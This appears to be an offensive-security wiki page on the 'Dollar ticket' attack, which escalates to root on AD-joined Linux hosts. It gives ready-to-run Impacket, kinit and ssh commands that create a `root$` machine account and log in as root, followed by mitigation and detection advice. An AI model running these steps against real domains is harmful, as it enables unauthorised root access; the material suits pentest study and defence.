---
authors: bl4ckarch, ShutdownRepo
category: ad
---

# Dollar ticket

## Theory

The Dollar ticket attack exploits name confusion vulnerabilities in Kerberos authentication within Active Directory environments. The attack leverages the behavior of machine accounts (which traditionally end with a `$` character) and the default principal-to-username mapping in MIT Kerberos implementations.

### Relationship with other principal confusion attacks

[sAMAccountName spoofing](./samaccountname-spoofing) and the [Dollar ticket attack](./dollar-ticket) both exploit weaknesses in how Active Directory and Kerberos handle machine account naming conventions (specifically the trailing `$`).

Common root causes:
- The long-standing convention that machine accounts end with `$` in their `sAMAccountName`.
- KDC behavior that can append or resolve `$` when a requested principal name does not exactly match an existing account.
- Abuse of [MachineAccountQuota](../../builtins/machineaccountquota.md) to create machine accounts.

Key differences compared to [sAMAccountName spoofing](./samaccountname-spoofing):
- Dollar ticket targets domain-joined Linux systems (instead of AD escalation)
- LPE via SSH as root (instead of impersonating a domain controller)
- Simpler in practice

While it shares technical roots with [sAMAccountName spoofing](./samaccountname-spoofing), the Dollar ticket attack primarily targets Linux/Unix hosts and uses a simpler attack chain focused on TGT name aliasing to act as root on that host.

### Attack principle

In Active Directory, machine accounts are created with a trailing dollar sign (e.g. `MACHINE$`). However, when Kerberos tickets are processed by certain services — particularly MIT-style Kerberos acceptors — the username mapping mechanism strips this trailing `$`. This creates an opportunity for privilege escalation.

The attack works as follows:

1. An attacker creates a machine account named `root$`
2. The attacker requests a TGT for the principal `root`
3. The Windows KDC does not find a user account named `root`, but finds the machine account `root$` and issues a ticket for it
4. When presented to an MIT Kerberos service (e.g. SSH), the service maps `root$@DOMAIN.COM` to the local user `root` by stripping the trailing `$`
5. The attacker gains access as the local `root` user

This relies on two behaviors: the default [MachineAccountQuota](../../builtins/machineaccountquota.md) of 10, which lets any domain user create machine accounts, and the MIT Kerberos `auth_to_local` rule that strips the trailing `$` when mapping principals to local usernames.

Note this example is based on `root` but would work on any other local account. 

### Attack vectors

This attack specifically targets:

- Linux/Unix systems joined to Active Directory using SSSD, realm, or similar tools
- Services relying on default MIT Kerberos principal-to-username mapping
- Environments where PAC (Privileged Attribute Certificate) validation is not enforced
- SSH daemons configured with GSSAPI authentication

### Historical context

The vulnerability was disclosed in November 2021 through multiple CVEs:

- CVE-2020-25717 (Samba): a user in an AD domain could become root on domain members
- CVE-2020-25719 (Samba AD DC): did not always rely on the SID and PAC in Kerberos tickets
- CVE-2021-42287 (Microsoft): authentication updates addressing privilege escalation
- CVE-2022-26923 (Certifried): related Active Directory privilege escalation vulnerability

## Practice

The attack requires valid domain user credentials and a non-zero [MachineAccountQuota](../../builtins/machineaccountquota.md) (default is 10). The target must be a Linux/Unix machine joined to the AD domain and using MIT-style Kerberos authentication without strict PAC validation.

### Exploitation steps

The attack can be conducted from any system with Impacket tools and network access to the domain controller.

```bash
# obtain initial Kerberos ticket
kinit $USER

# create a machine account named after a privileged local user
addcomputer.py -k -dc-host "$DC_IP" -computer-name 'root' -computer-pass 'ComplexPassword123!' "$DOMAIN"/"$USER"

# request a TGT for the principal 'root' (the KDC will find and issue a ticket for 'root$')
kinit root

# authenticate to the target (MIT Kerberos maps root$ -> root)
ssh -o PreferredAuthentications=gssapi-with-mic -l root "$TARGET"
```

For environments requiring password authentication:

```bash
# create a machine account with password
addcomputer.py -dc-ip "$DC_IP" -computer-name 'root' -computer-pass 'ComplexPassword123!' "$DOMAIN"/"$USER":"$PASSWORD"

# request a TGT for the machine account
getTGT.py "$DOMAIN"/'root$':'ComplexPassword123!' -dc-ip "$DC_IP"

export KRB5CCNAME='root$.ccache'

ssh -o PreferredAuthentications=gssapi-with-mic -l root "$TARGET"
```

> [!TIP]
> The machine account password must comply with domain password policy requirements. Use complex passwords with sufficient length, uppercase, lowercase, numbers, and special characters.

### Cleanup

```bash
# using Impacket
addcomputer.py -delete -dc-ip $DC_IP -computer-name 'root' "$DOMAIN/$USER:$PASSWORD"
```

```powershell
# using PowerShell
Remove-ADComputer -Identity "root" -Confirm:$false
```

## Mitigation

- Set `ms-DS-MachineAccountQuota` to `0` (e.g. with `Set-ADDomain`)
- Restrict `SeMachineAccountPrivilege` through Group Policy
- Pre-create privileged local accounts as AD disabled accounts so that they can't be created by an attacker
- For systems using SSSD 2.7 or later, enable PAC validation (in `/etc/sssd/sssd.conf`, set `pac_check = pac_present, upn_dns_info_ex_present`)
- Disable the default `auth_to_local` name translation plugin when using SSSD or Winbind (in `/etc/krb5.conf.d/disable-localauth.conf`, add `localauth = {disable = an2ln}` in `[plugins]`)
- Disable root SSH login (in `/etc/ssh/sshd_config`, set `PermitRootLogin no`)


### Detection

- Alert on machine accounts created by standard users
- Monitor for machine accounts with privileged usernames (e.g. `root$`, `admin$`)
- Detect Kerberos authentication patterns inconsistent with normal behavior
- Track `KRB_TGS_REQ` requests without corresponding `KRB_AS_REQ` events

## Resources

[https://wiki.samba.org/index.php/Security/Dollar_Ticket_Attack](https://wiki.samba.org/index.php/Security/Dollar_Ticket_Attack)

[https://web.mit.edu/kerberos/krb5-latest/doc/admin/host_config.html](https://web.mit.edu/kerberos/krb5-latest/doc/admin/host_config.html)

[https://bl4ckarch.github.io/posts/GOAD-DRACARYS](https://bl4ckarch.github.io/posts/GOAD-DRACARYS)